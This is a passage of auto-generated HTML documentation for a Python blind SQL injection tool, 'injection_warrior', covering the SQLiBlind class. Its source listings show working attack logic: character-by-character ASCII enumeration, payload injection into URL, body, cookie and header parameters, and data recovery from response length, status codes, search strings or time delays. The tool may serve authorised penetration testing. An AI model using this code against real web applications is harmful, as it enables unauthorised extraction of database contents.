                                                                 content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp))
                elif injection_point == &#34;url&#34;:
                    responses_results.append(self.__extract_data(param=url_param, search_string=search_string, status_code=status_code,
                                                                 content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp))
                elif injection_point == &#34;body&#34;:
                    responses_results.append(self.__extract_data(param=body_param, search_string=search_string, status_code=status_code,
                                                                 content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp))
        except TypeError as e:
            print(colored(&#34;[-] Error __process_responses: {}&#34;.format(e), &#34;red&#34;))
            sys.exit(0)

        return self.__display_responses(responses=responses_results, search_string=search_string, status_code=status_code,
                                        content_length=content_length, soup_html=soup_html, comma=comma, client_resp=client_resp, sleep=sleep)

    def __display_responses(self, responses=[], search_string=&#34;&#34;, status_code=404,
                            content_length=-1, soup_html=&#34;&#34;, comma=&#34;&#34;, client_resp=&#34;&#34;, sleep=0):
        flatten_responses = [
            item for sublist in responses for item in sublist]
        filtered_results = []
        for r in flatten_responses:
            for k, v in r.items():
                if k == &#34;elapsed&#34;:
                    v = int(v)
                    if v == int(sleep):
                        filtered_results.append(r)
                elif v == search_string and len(search_string) &gt; 0:
                    filtered_results.append(r)
                elif k == &#34;expect_status_code&#34; and client_resp != None and type(client_resp) != str:
                    if v == client_resp.status:
                        filtered_results.append(r)
                elif k == &#34;resp_content_length&#34;:
                    if content_length != None and int(v) &gt; content_length and content_length &gt; 0:
                        filtered_results.append(r)
                    # print(&#34;data: {}, iter: {}&#34;.format(r.get(&#39;ascii&#39;), r.get(&#39;iter&#39;)))

        print(filtered_results)
        data =[]
        for item in sorted(filtered_results, key=lambda i: i[&#39;iter&#39;]):
            for k, v in item.items():
                if k == &#34;iter&#34;:
                    # print(item.get(&#39;ascii&#39;), end=&#39;&#39;)
                    temp = item.get(&#39;ascii&#39;)
                    data.append(temp)
        return &#39;&#39;.join(data)

    def __extract_data(self, param=None, search_string=&#34;&#34;, status_code=0, content_length=-1, soup_html=None, comma=&#39;,&#39;, client_resp=None, elapsed=None):
        params = param.keys()
        responses_results = []
        ascii_value = &#34;&#34;
        resp_text = &#34;&#34;
        for key in params:
            m = re.search(r&#39;(%2c|,)\d+(%2c|,){1}&#39;, param.get(key))
            iteration = m.group(0).split(comma)[1]
            m = re.search(r&#39;(\)=)\d{1,3}&#39;, param.get(key))
            ascii_value = m.group(0).split(&#39;=&#39;)[1]
            if len(search_string) &gt; 0:
                resp_text = soup_html.find(text=re.compile(search_string))
            responses_results.append({&#39;search_string&#39;: resp_text, &#39;resp_status_code&#39;: client_resp.status if client_resp != None else &#34;&#34;, &#39;ascii&#39;: chr(
                int(ascii_value)), &#34;iter&#34;: int(iteration), &#34;resp_content_length&#34;:client_resp.headers[&#39;Content-Length&#39;], &#34;content_length&#34;: content_length, &#34;expect_status_code&#34;: status_code, &#34;elapsed&#34;: elapsed if elapsed != None else 1})
        # print(responses_results)
        return responses_results

    def __divide_conquer(self):
        reminders = []
        ascii_table = [x for x in range(32, 126)]
        for item in ascii_table:
            char = 128
            high_half = 0
            reminder = 128
            temp = char
            while char &gt; 1:
                if reminder not in reminders:
                    reminders.append(reminder)
                if item &lt; char:
                    high_half = char - temp
                    char = int(temp / 2)
                    reminder = char + high_half
                    temp = char
                else:
                    char = int(temp/2)
                    reminder = reminder + char
                    char = reminder
        return reminders

    def __get_prepared_params(self, params={}, payloads=[], **kwargs):
        values = []
        # TODO Fix usage of divide_conquer 
        # questions = self.__divide_conquer()
        questions = [x for x in range(32, 126)]
        # print(&#34;QUESTIONS&#34;, questions)
        for q in questions:
            for i in range(1, kwargs.get(&#39;iterations&#39;)+1):
                kwargs[&#39;iterations&#39;] = i
                kwargs[&#39;char&#39;] = q
                temp = self._parse_template(payloads=payloads, **kwargs)
                values.append(temp)
        flatten_values = [
            item for sublist in values for item in sublist]
        params_list = self._params_converted(
            payloads=flatten_values, params=params)
        return params_list

    def __get_time_based_results(self, responses=[], sleep=0, injection_point=&#34;url&#34;,  status_code=&#34;&#34;, content_length=&#34;&#34;, search_string=&#34;&#34;, comma=&#34;,&#34;):
        flatten_resp = [item for sublist in responses for item in sublist]
        responses_results = []
        soup_html=None,
        response = None
        for r in flatten_resp:
            response = r.get(&#39;raw_response&#39;)
            header_param = r.get(&#39;header_params&#39;)
            json_resp = r.get(&#39;json_resp&#39;)
            soup_html = r.get(&#39;soup&#39;)
            cookie_param = r.get(&#39;cookie&#39;)
            url_param = r.get(&#39;url_param&#39;)
            header_param = r.get(&#39;header_param&#39;)
            body_param = r.get(&#39;body_param&#39;)
            elapsed = r.get(&#39;elapsed&#39;)
            
            if injection_point == &#34;cookie&#34;:
                responses_results.append(
                    (elapsed, cookie_param, response, soup_html, content_length, status_code, search_string))
            elif injection_point == &#34;body&#34;:
                responses_results.append(
                    (elapsed, body_param, response, soup_html, content_length, status_code, search_string))
            elif injection_point == &#34;header&#34;:
                responses_results.append(
                    (elapsed, header_param, response, soup_html, content_length, status_code, search_string))
            elif injection_point == &#34;url&#34;:
                responses_results.append(
                    (elapsed, url_param, response, soup_html, content_length, status_code, search_string))

        n_responses = []
        for item in responses_results:
            n_responses.append(self.__extract_data(elapsed=item[0], param=item[1], client_resp=response,
                                                   soup_html=soup_html, comma=comma, content_length=content_length, status_code=status_code, search_string=search_string))
        return self.__display_responses(responses=n_responses, sleep=sleep)</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="injection_warrior.warrior.Injector" href="warrior.html#injection_warrior.warrior.Injector">Injector</a></li>
<li><a title="injection_warrior.common.Common" href="common.html#injection_warrior.common.Common">Common</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="injection_warrior.sqli_blind.SQLiBlind.inject_payload"><code class="name flex">
<span>def <span class="ident">inject_payload</span></span>(<span>self, url='', payloads={}, blind_type='', content_length=None, status_code=0, search_string='', http_method='get', injection_point='url', body_params={}, req_json=False, resp_json=False, html=False, cookie_params={}, url_params={}, header_params={}, resp_body=True, **kwargs)</span>
</code></dt>
<dd>
<div class="desc"><p>method allows to inject payloads to HTTP request/s
When payloads are used, header|body|cookie|url dictionary should have value as %$%
example: url_params = {"productId": %$%}</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>url</code></strong> :&ensp;<code>str</code></dt>
<dd>[URL for endpoint]. Defaults to "".</dd>
<dt><strong><code>payloads</code></strong> :&ensp;<code>list</code>, optional</dt>
<dd>[list of payloads for which requests will be generated]. Defaults to [].</dd>
<dt><strong><code>http_method</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>[HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to "get".</dd>
<dt><strong><code>injection_point</code></strong> :&ensp;<code>str</code>, optional</dt>
<dd>[Place where payloads should be injected]. Defaults to "url".</dd>
<dt><strong><code>body_params</code></strong> :&ensp;<code>dict</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>req_json</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if request should be send as JSON formatted data]. Defaults to False.</dd>
<dt><strong><code>resp_json</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if response should be displayed as JSON formatted data]. Defaults to False.</dd>
<dt><strong><code>html</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if response should be displayed as HTML]. Defaults to False.</dd>
<dt><strong><code>cookie_params</code></strong> :&ensp;<code>dict</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>url_params</code></strong> :&ensp;<code>list</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>header_params</code></strong> :&ensp;<code>list</code>, optional</dt>
<dd>[Dictionary with key:value pair for parameters]. Defaults to {}.</dd>
<dt><strong><code>resp_body</code></strong> :&ensp;<code>bool</code>, optional</dt>
<dd>[Flag define if response body should be printed on output console]. Defaults to True.</dd>
</dl>
<p>kwargs(dict, optional) [quote: "'", delimiter: '+', comment: '&ndash;', comma: ",", oracle: False, nulls: 1, table_name:
"", column_name_1: "", column_name_2: "", sleep: 5]</p>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>[dict]</code></dt>
<dd>Dictionary as key value pair</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def inject_payload(self, url=&#34;&#34;, payloads={}, blind_type=&#34;&#34;, 
                   content_length=None, status_code=0, 
                   search_string=&#34;&#34;, http_method=&#34;get&#34;, injection_point=&#34;url&#34;,  
                   body_params={}, req_json=False, resp_json=False, html=False, 
                   cookie_params={}, url_params={}, header_params={}, resp_body=True, **kwargs):
    &#34;&#34;&#34;method allows to inject payloads to HTTP request/s
       When payloads are used, header|body|cookie|url dictionary should have value as %$%
       example: url_params = {&#34;productId&#34;: %$%}

    Args:
        url (str): [URL for endpoint]. Defaults to &#34;&#34;.
        payloads (list, optional): [list of payloads for which requests will be generated]. Defaults to [].
        http_method (str, optional): [HTTP method (GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD)]. Defaults to &#34;get&#34;.
        injection_point (str, optional): [Place where payloads should be injected]. Defaults to &#34;url&#34;.
        body_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        req_json (bool, optional): [Flag define if request should be send as JSON formatted data]. Defaults to False.
        resp_json (bool, optional): [Flag define if response should be displayed as JSON formatted data]. Defaults to False.
        html (bool, optional): [Flag define if response should be displayed as HTML]. Defaults to False.
        cookie_params (dict, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        url_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        header_params (list, optional): [Dictionary with key:value pair for parameters]. Defaults to {}.
        resp_body (bool, optional): [Flag define if response body should be printed on output console]. Defaults to True.
        kwargs(dict, optional) [quote: &#34;&#39;&#34;, delimiter: &#39;+&#39;, comment: &#39;--&#39;, comma: &#34;,&#34;, oracle: False, nulls: 1, table_name:  &#34;&#34;, column_name_1: &#34;&#34;, column_name_2: &#34;&#34;, sleep: 5]

    Returns:
        [dict]: Dictionary as key value pair
    &#34;&#34;&#34;
    
    sleep = kwargs.get(&#39;sleep&#39;) if kwargs.get(&#39;sleep&#39;) != None else 5
    iterations = kwargs.get(&#39;iterations&#39;) if kwargs.get(&#39;iterations&#39;) != None else 1
    comma = kwargs.get(&#39;comma&#39;) if kwargs.get(&#39;comma&#39;) != None else &#34;,&#34;

    if self.debug:
        print(colored(
            &#39;&#39;&#39;[+] BLIND attack &#39;inject_payload&#39; selected parameters: 
        ITERATIONS: {}
        BLIND TYPE ATTACK: {}
        EXPECTED STATUS CODE: {}
        EXPECTED CONTENT LENGTH: {}
        EXPECTED SEARCH STRING: {}
        TIME BASED SLEEP: {}
        URL: {}
        HTTP METHOD: {}
        ORIGINAL PAYLOAD: {}
        INJECTION POINT: {}
        BODY PARAMS: {}
        REQ JSON: {}
        RESP JSON: {}
        RETURN HTML: {}
        COOKIE PARAMS: {}
        URL PARAMS: {}
        BODY PARAMS: {}
        HEADER PARAMS: {}
        RESP_BODY:{}
        KWARGS: {}
         &#39;&#39;&#39;.format(iterations, blind_type, status_code, content_length, search_string, sleep, url, http_method, payloads, injection_point, 
                    body_params, req_json, resp_json, html, cookie_params, url_params, body_params, header_params,
            resp_body, kwargs), &#34;yellow&#34;))

    values = []
    cookie_params_list = []

    urls = self._url_path_parse(url, payloads)
    if not len(urls) &gt; 0:
        urls = [url]

    if search_string != &#34;&#34; and not html:
        print(colored(
            &#34;[-] Not supported combination for search_string:&#39;{}&#39; and html: &#39;{}&#39; &#34;.format(search_string, html), &#34;red&#34;))
        sys.exit(0)

    if iterations &gt; 0 and blind_type == &#34;time_based&#34;:
        # TODO FINISH OTHER INJECTION POINTS
        responses = []
        if injection_point == &#34;cookie&#34;:
            cookie_params_list = self.__get_prepared_params(params=cookie_params, payloads=payloads, **kwargs)
            for cookie_params in cookie_params_list:
                responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                       url_params=url_params, header_params=header_params, resp_body=resp_body))
        elif injection_point == &#34;url&#34;:
            url_params_list = self.__get_prepared_params(params=url_params, payloads=payloads, **kwargs)
            for url_params in url_params_list:
                responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                       url_params=url_params, header_params=header_params, resp_body=resp_body))
        elif injection_point == &#34;body&#34;:
            body_params_list = self.__get_prepared_params(params=body_params, payloads=payloads, **kwargs)
            for body_params in body_params_list:
                responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                       url_params=url_params, header_params=header_params, resp_body=resp_body))
        elif injection_point == &#34;header&#34;:
            header_params_list = self.__get_prepared_params(params=header_params, payloads=payloads, **kwargs)
            for header_params in header_params_list:
                responses.append(super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params,
                                                                       url_params=url_params, header_params=header_params, resp_body=resp_body))

        return self.__get_time_based_results(responses=responses, sleep=kwargs.get(&#39;sleep&#39;), injection_point=injection_point, status_code=status_code, content_length=content_length, search_string=search_string, comma=kwargs.get(&#39;comma&#39;))

    if iterations &gt; 0 and blind_type != &#34;time_based&#34;:
        responses = []
        if injection_point == &#34;cookie&#34;:
            cookie_params_list = self.__get_prepared_params(params=cookie_params, payloads=payloads, **kwargs)
            responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                 cookie_params=cookie_params_list, url_params=url_params, body_params=body_params, header_params=header_params, req_json=req_json, resp_json=resp_json, resp_body=resp_body)
        elif injection_point == &#34;url&#34;:
            url_params_list = self.__get_prepared_params(params=url_params, payloads=payloads, **kwargs)
            responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                cookie_params=cookie_params, url_params=url_params_list, body_params=body_params, header_params=header_params, req_json=req_json, resp_json=resp_json, resp_body=resp_body)

        elif injection_point == &#34;body&#34;:
            body_params_list = self.__get_prepared_params(params=body_params, payloads=payloads, **kwargs)
            responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                cookie_params=cookie_params, url_params=url_params, body_params=body_params_list, header_params=header_params, req_json=req_json, resp_json=resp_json, resp_body=resp_body)

        elif injection_point == &#34;header&#34;:
            header_params_list = self.__get_prepared_params(params=header_params, payloads=payloads, **kwargs)
            responses = self._run(http_method=http_method, urls=urls, html=html, injection_point=injection_point,
                                cookie_params=cookie_params, url_params=url_params, body_params=body_params, header_params=header_params_list, req_json=req_json, resp_json=resp_json, resp_body=resp_body)

        return self.__process_responses(responses=responses, search_string=search_string,
                                    status_code=status_code, content_length=content_length, url=url, injection_point=injection_point, comma=comma, sleep=sleep)

    return super(SQLiBlind, self).inject_payload(url=url, payloads=payloads, http_method=http_method, injection_point=injection_point,  body_params=body_params, req_json=req_json, resp_json=resp_json, html=html, cookie_params=cookie_params, url_params=url_params, header_params=header_params, resp_body=resp_body)</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="injection_warrior" href="index.html">injection_warrior</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="injection_warrior.sqli_blind.SQLiBlind" href="#injection_warrior.sqli_blind.SQLiBlind">SQLiBlind</a></code></h4>
<ul class="">
<li><code><a title="injection_warrior.sqli_blind.SQLiBlind.inject_payload" href="#injection_warrior.sqli_blind.SQLiBlind.inject_payload">inject_payload</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc"><cite>pdoc</cite> 0.9.1</a>.</p>
</footer>
</body>
</html>